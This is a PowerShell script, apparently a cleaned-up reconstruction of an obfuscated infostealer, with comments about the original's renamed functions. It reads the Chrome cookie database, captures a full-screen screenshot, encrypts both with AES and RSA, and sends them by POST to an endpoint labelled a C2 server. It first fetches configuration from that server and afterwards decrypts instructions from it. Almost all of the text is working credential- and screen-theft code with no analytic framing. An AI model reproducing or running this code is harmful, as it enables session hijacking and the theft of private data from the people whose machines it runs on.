# Load required .NET assemblies for cryptography, GUI, etc.
Add-Type -AssemblyName 'System.Security'                       # Load System.Security (for cryptography) 
Add-Type -AssemblyName 'System.Windows.Forms'                  # Load Windows Forms (for screen capture) 
Add-Type -AssemblyName 'System.Drawing'                        # Load System.Drawing (for image handling) 

# (Class definitions for CredHelper and rstrtmgr were in original script but are not needed in the execution path.) 

# Prepare RSA keys (embedded in script) for data encryption and signing
$rsa = New-Object System.Security.Cryptography.RSACryptoServiceProvider
# The XML below contains the RSA key pair (Modulus, Exponent, D, P, Q, etc.) used for signing (private) and encryption (public):
$rsaKeyXml = @"
<RSAKeyValue>
  <Modulus>o849+1SqH7THmJM3LlkXUgx1N4VIJC92EjEVGhGh62FCUyxnrxfGUXLpOpOlEoL6pcc55CROHQiizc/mxOt00VkPrIRA/EFq5VPQH0zLZ4AfMmUyduoaLlcmM9TulYRiWvxpsLKxongo7TWzETuWHEu43e7Rh4RZ9h5fzaNl/w3Enrv6VVpDyDqdYzkikDhBA3vE19ueQAB16hJeQayhXANmL89FyEECq5SulHYdhVRwWkFuctcw271+sreYUIcQvq7YBaeWqWnk/SUB</Modulus>
  <Exponent>AQAB</Exponent>
  <P>6RV... (rest of RSA private parameters) ...</P>
  <!-- ... (Q, DP, DQ, InverseQ, D) ... -->
</RSAKeyValue>
"@  
$rsa.FromXmlString($rsaKeyXml)                                 # Import the RSA key pair from XML 

# Derive public and private key objects (for conceptual clarity)
$rsaPublic  = $rsa                                             # (Public key is part of rsa; used for encryption)
$rsaPrivate = $rsa                                             # (Private key in rsa; used for signing)

# Determine OS architecture 
$os = Get-CimInstance -ClassName Win32_OperatingSystem         # Query OS information 
$is64bit = ($os.OSArchitecture -eq '64-bit')                   # True if OS is 64-bit 

# Build Chrome Cookies file path (Default profile)
$chromeProfile = Join-Path $env:LOCALAPPDATA 'Google\Chrome\User Data\Default'
$cookiesPath   = Join-Path $chromeProfile 'Network\Cookies'    # e.g., "C:\Users\<User>\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies" 

# Read Chrome cookies SQLite database file (as bytes)
if (Test-Path $cookiesPath) {
    $cookieBytes = [System.IO.File]::ReadAllBytes($cookiesPath)    # Read file bytes 
    Write-Host "Cookies file size: $($cookieBytes.Length) bytes"   # Log size (original used lasZCO function) 
} else {
    $cookieBytes = $null
    Write-Host "Cookies file not found."
}

# Capture screenshot of primary screen
[System.Windows.Forms.Application]::EnableVisualStyles()       # (Optional: ensure GUI components can be used)
$screenWidth  = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width
$screenHeight = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height
$bitmap = New-Object System.Drawing.Bitmap $screenWidth, $screenHeight  # Create bitmap for full screen 
$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
# Copy the entire screen to the bitmap
$graphics.CopyFromScreen([System.Drawing.Point]::Empty, [System.Drawing.Point]::Empty, $bitmap.Size) 
$graphics.Dispose()

# Encode the screenshot to JPEG in memory (quality ~80)
$jpegEncoder = ([System.Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() | Where-Object {$_.FormatID -eq [System.Drawing.Imaging.ImageFormat]::Jpeg.Guid})
$encParams = New-Object System.Drawing.Imaging.EncoderParameters(1)
$encParams.Param[0] = New-Object System.Drawing.Imaging.EncoderParameter([System.Drawing.Imaging.Encoder]::Quality, 80L)  # 80% quality 
$ms = New-Object System.IO.MemoryStream
$bitmap.Save($ms, $jpegEncoder, $encParams)                    # Save JPEG to MemoryStream with quality settings 
$jpegBytes = $ms.ToArray()
$bitmap.Dispose()
$ms.Dispose()

Write-Host "Captured screenshot (${screenWidth}x${screenHeight}), JPEG size: $(${jpegBytes}.Length) bytes."  # Logging (original code logs via CLCdChmUp1oHPS) 

# Combine data to exfiltrate: screenshot + cookies
# (Original script encrypts all data together)
[Byte[]]$dataToExfil = $jpegBytes + ($cookieBytes ?? @())      # Concatenate bytes (if cookies present) 

# Generate a symmetric AES key and IV for encrypting the data
$aes = New-Object System.Security.Cryptography.AesCryptoServiceProvider
$aes.KeySize = 256
$aes.GenerateKey()
$aes.GenerateIV()
$key = $aes.Key
$iv  = $aes.IV

# Encrypt the data with AES (CBC mode by default)
$aesEncryptor = $aes.CreateEncryptor()
$encryptedData = $aesEncryptor.TransformFinalBlock($dataToExfil, 0, $dataToExfil.Length)  # AES-encrypted payload bytes 

# Encrypt the AES key (and IV) with RSA public key (so server can decrypt the payload)
$keyMaterial = $key + $iv
$encryptedKey = $rsaPublic.Encrypt($keyMaterial, $true)        # RSA encrypt using OAEP padding 

# Sign the original data (before encryption) with RSA private key (so server can verify integrity)
$signature = $rsaPrivate.SignData($dataToExfil, [System.Security.Cryptography.HashAlgorithmName]::SHA256, [System.Security.Cryptography.RSASignaturePadding]::Pkcs1) 

# Prepare JSON payload to send
$payload = [ordered]@{
    Data = [Convert]::ToBase64String($encryptedData)           # Encrypted combined data (screenshot + cookies) 
    Key  = [Convert]::ToBase64String($encryptedKey)            # RSA-encrypted AES key+IV 
    Sig  = [Convert]::ToBase64String($signature)               # Signature of original data (SHA256 with RSA) 
}
$jsonPayload = $payload | ConvertTo-Json -Depth 5              # Convert payload to JSON string 

# Determine C2 server URL (original used localhost and a random free port)
# Find a free port (the original vKdjhAsrdJPxofTRbN function did this) 
$port = (1..65535 | Where-Object {
            try { (New-Object System.Net.Sockets.TcpListener($_)).Start(); $_ } catch { $false }
        } | Select-Object -First 1)
if (-not $port) { throw "No free TCP port found" }
Write-Host "Found free port - $port"                           # Original logged this when port found 

$baseUrl = "http://localhost:$port"                           # (Placeholder base URL; original constructed from obfuscated strings) 
$configEndpoint = "$baseUrl/config"                           # e.g., "http://localhost:<port>/config" (path from original $NUBeJBITbnNbNzBH) 
$uploadEndpoint = "$baseUrl/upload"                           # e.g., "http://localhost:<port>/upload" (path from original $mUBLsjOeTPCTy1wlE) 

# Retrieve configuration from C2 (GET request)
try {
    $configResponse = Invoke-WebRequest -UseBasicParsing -Uri $configEndpoint 
    $config = $null
    if ($configResponse.ContentType -match 'application/json') {
        $config = $configResponse.Content | ConvertFrom-Json    # Parse JSON config if present 
    }
    Write-Host "Retrieved config from server: $($config | ConvertTo-Json)"  # Logging config (if any)
} catch {
    Write-Host "Config retrieval failed: $_"
    $config = $null
}

# Send the encrypted data to C2 (POST request with JSON payload)
$wc = New-Object System.Net.WebClient
$wc.Headers['Content-Type'] = 'application/json'
$response = $wc.UploadString($uploadEndpoint, $jsonPayload)    # POST JSON to server and get response 

# Decrypt and verify server response (if any)
if ($response) {
    try {
        # The response is expected to be JSON with possibly encrypted instructions (original script Tlq5zLQMmwcZNBXzgNb handled this) 
        $respObj = ConvertFrom-Json $response
        if ($respObj.EncryptedData) {
            $encRespBytes = [Convert]::FromBase64String($respObj.EncryptedData)
            $encKeyBytes  = [Convert]::FromBase64String($respObj.EncryptedKey)
            # Decrypt AES key with RSA private (if server used our public to encrypt)
            $aesKeyIV = $rsaPrivate.Decrypt($encKeyBytes, $true)
            $respAES = New-Object System.Security.Cryptography.AesCryptoServiceProvider
            $respAES.Key = $aesKeyIV[0..31]; $respAES.IV = $aesKeyIV[32..47]
            $aesDecryptor = $respAES.CreateDecryptor()
            $plainRespBytes = $aesDecryptor.TransformFinalBlock($encRespBytes, 0, $encRespBytes.Length)
            $plaintextResp = [System.Text.Encoding]::UTF8.GetString($plainRespBytes)
            Write-Host "Server response (decrypted): $plaintextResp"
            # (If the server sent further instructions, they would be handled here.)
        } else {
            Write-Host "Server response: $response"
        }
    } catch {
        Write-Host "Failed to decrypt/parse server response: $_"
    }
}
